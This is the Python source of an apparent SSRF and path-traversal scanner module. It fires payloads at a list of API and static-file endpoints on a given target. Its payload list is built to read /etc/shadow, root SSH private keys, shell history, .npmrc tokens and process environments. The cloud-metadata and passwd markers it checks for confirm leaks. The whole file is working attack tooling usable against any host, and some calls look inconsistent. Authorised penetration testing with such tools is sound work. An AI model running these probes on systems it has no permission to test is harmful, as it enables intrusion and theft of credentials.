"""SSRF + Path Traversal Scanner"""
from core.config import SSRF_PAYLOADS, SSRF_PARAMS, R, R2, B, B2, W, Y, G, D, N
from core.engine import http_get, http_post, save_report, vuln
import urllib.parse

SSRF_ENDPOINTS = ["/api/fetch", "/api/proxy", "/api/url", "/api/request",
                  "/api/download", "/api/image", "/api/webhook", "/api/preview",
                  "/api/import", "/api/external", "/api/callback", "/api/load"]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//etc/shadow", "../../../proc/self/environ",
    "../../../var/log/auth.log", "../../../root/.ssh/id_rsa",
    "../../../root/.bash_history", "../../../home/node/.npmrc",
]

def run(target):
    print(f"\n{B2}  SSRF + Path Traversal scan on {W}{target}{N}")
    vulns = 0; findings = []

    # SSRF via GET
    print(f"\n{D}  Testing SSRF via GET parameters...{N}")
    ssrf_markers = ["ami-id","instance-id","local-hostname","meta-data",
                    "root:x:0:0:","127.0.0.1","localhost","internal"]
    for ep in SSRF_ENDPOINTS:
        for param in SSRF_PARAMS[:8]:
            for payload in SSRF_PAYLOADS[:6]:
                url = f"{target}{ep}?{param}={urllib.parse.quote(payload)}"
                code, hdrs, body = http_get(url, timeout=7)
                if code == 0: continue
                if any(m in body for m in ssrf_markers):
                    vuln("CRITICAL", f"SSRF via ?{param}=", f"Internal data leaked", url)
                    vulns += 1; findings.append({"type":"ssrf","param":param,"url":url})
                    break

    # SSRF via POST
    print(f"\n{D}  Testing SSRF via POST...{N}")
    for ep in SSRF_ENDPOINTS[:5]:
        url = target + ep
        for payload in SSRF_PAYLOADS[:4]:
            data = json.dumps({"url": payload}) if False else f'{{"url":"{payload}"}}'
            code, body = http_post(url, data, timeout=8)
            if code in (200, 201) and any(m in body for m in ssrf_markers):
                vuln("CRITICAL", f"SSRF via POST {ep}", url)
                vulns += 1; findings.append({"type":"ssrf_post","url":url})
                break

    # Path Traversal
    print(f"\n{D}  Testing path traversal...{N}")
    trav_endpoints = ["/static/", "/public/", "/files/", "/uploads/",
                      "/assets/", "/download/", "/api/file/", "/api/download/",
                      "/images/", "/docs/", "/resources/"]
    lfi_markers = ["root:x:0:0:", "daemon:", "www-data:", "bin:x:",
                   "SSH_PRIVATE", "npmrc", "HISTFILE"]
    for ep in trav_endpoints:
        for payload in TRAVERSAL_PAYLOADS[:6]:
            url = target + ep + payload
            code, hdrs, body = http_get(url, timeout=7)
            if code == 0: continue
            if any(m in body for m in lfi_markers):
                vuln("CRITICAL", f"Path traversal on {ep}", f"File content leaked", url)
                vulns += 1; findings.append({"type":"traversal","url":url})
                break

    # Path traversal via params
    for param in ["file", "path", "name", "doc", "download", "filename", "img"]:
        for payload in TRAVERSAL_PAYLOADS[:4]:
            url = f"{target}/api/file?{param}={urllib.parse.quote(payload)}"
            code, hdrs, body = http_get(url, timeout=7)
            if code == 200 and any(m in body for m in lfi_markers):
                vuln("CRITICAL", f"Path traversal via ?{param}=", url)
                vulns += 1; findings.append({"type":"traversal_param","param":param,"url":url})
                break

    print(f"\n{G}  [✓] SSRF/Traversal scan done — {vulns} findings{N}")
    if findings: save_report("ssrf_traversal", {"target":target,"findings":findings})
    return vulns
